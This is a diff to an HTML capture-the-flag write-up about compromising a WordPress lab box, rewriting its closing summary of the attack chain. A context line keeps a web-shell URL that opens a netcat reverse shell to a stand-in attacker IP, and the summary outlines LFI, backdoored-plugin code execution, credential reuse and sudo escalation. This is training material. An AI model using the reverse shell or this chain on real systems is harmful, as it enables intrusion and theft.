@@ -183,8 +183,8 @@ http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%20ATTACK_IP%20443%20-e%2
 root@smol:~# <span class="tok-func">cat</span> /root/root.txt
 <span class="tok-comment"># root flag</span></code></pre>
 
-<h3>8 · Retrospective</h3>
-<p>Attack chain: plugin LFI → wp-config creds → poisoned-plugin RCE → hash crack → SSH key theft → old-zip cred leak → full sudo. Lessons: drop stale plugins, review third-party code, and DB/SSH/zip password reuse makes the box one long sudo.</p>
+<h3>8 · What Made It Work</h3>
+<p>Steps 3 and 4 are one bug. A backdoor in a plugin file is worth nothing if reading that file runs it instead of showing it, so the <code>php://filter</code> LFI from step 2 is also the delivery mechanism, and the whole chain hangs on that single trick. The password reuse is a second chain on top: the same credential pattern walks you from the database to an SSH key to an old zip to a user with <code>(ALL : ALL) ALL</code> in sudoers.</p>
 
       </article>
 
